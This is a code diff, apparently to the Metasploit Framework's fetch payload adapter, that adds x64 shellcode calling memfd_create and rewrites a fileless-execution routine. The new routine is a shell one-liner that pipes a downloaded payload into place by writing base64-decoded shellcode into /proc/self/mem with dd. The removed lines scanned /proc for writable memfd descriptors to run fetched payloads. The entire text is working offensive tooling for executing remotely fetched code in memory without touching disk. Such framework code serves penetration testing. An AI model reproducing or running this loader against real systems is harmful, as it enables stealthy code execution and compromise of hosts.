@@ -232,29 +232,47 @@ module Msf::Payload::Adapter::Fetch
     end
     _execute_add(get_file_cmd)
   end
+  
+  def _generate_first_stage_shellcode
+    case module_info['AdaptedArch']
+    when "x64"
+      in_memory_loader_asm = %^      
+      start:
+          xor rsi, rsi
+          push rsi
+          lea rdi, [rsp]
+          inc rsi
+          mov rax, 0x13F
+          syscall
+      ^
+      payload = Metasm::Shellcode.assemble(Metasm::X64.new, in_memory_loader_asm).encode_string
+    when "x86"
+      puts "Not implemented yet"
+    when "aarch64"
+      puts "Not implemented yet"
+    when "armle"
+      puts "Not implemented yet"
+    when "armbe"
+      puts "Not implemented yet"
+    when "mips64"
+      puts "Not implemented yet"
+    when "mipsbe"
+      puts "Not implemented yet"
+    when "mipsle"
+      puts "Not implemented yet"
+    when "ppc"
+      puts "Not implemented yet"
+    when "ppc64"
+      puts "Not implemented yet"
+    else
+      fail_with(Msf::Module::Failure::BadConfig, 'Unsupported architecture')
+    end
+    Base64.strict_encode64(payload)
+  end
 
   # The idea behind fileless execution are anonymous files. The bash script will search through all processes owned by $USER and search from all file descriptor. If it will find anonymous file (contains "memfd") with correct permissions (rwx), it will copy the payload into that descriptor with defined fetch command and finally call that descriptor
   def _generate_fileless(get_file_cmd)
-    # get list of all $USER's processes
-    cmd = "echo $(cd /proc/self;read a<syscall; exec 3>mem;base64 -d <<<agC4PwEAAEiJ50gx9g8FSYnQkOv9|dd bs=1 seek=$[`cut -d\\  -f9<<<$a`]>&3;read b<syscall; read) & FOUND=0"
-    cmd << ";for i in $(ps -u $USER | awk '{print $1}')"
-    # already found anonymous file where we can write
-    cmd << '; do if [ $FOUND -eq 0 ]'
-
-    # look for every symbolic link with write rwx permissions
-    # if found one, try to download payload into the anonymous file
-    # and execute it
-    cmd << '; then for f in $(find /proc/$i/fd -type l -perm u=rwx 2>/dev/null)'
-    cmd << '; do if [ $(ls -al $f | grep -o "memfd" >/dev/null; echo $?) -eq "0" ]'
-    cmd << "; then if $(#{get_file_cmd} >/dev/null)"
-    cmd << '; then $f'
-    cmd << '; FOUND=1'
-    cmd << '; break'
-    cmd << '; fi'
-    cmd << '; fi'
-    cmd << '; done'
-    cmd << '; fi'
-    cmd << '; done'
+    "#{get_file_cmd} | $(cd /*/$$;read a<*l;exec 3>mem;echo $$;base64 -d<<<#{_generate_first_stage_shellcode}|dd bs=1 seek=$[`cut -d\\  -f9<<<$a`]>&3)" 
   end
 
   def _generate_curl_command
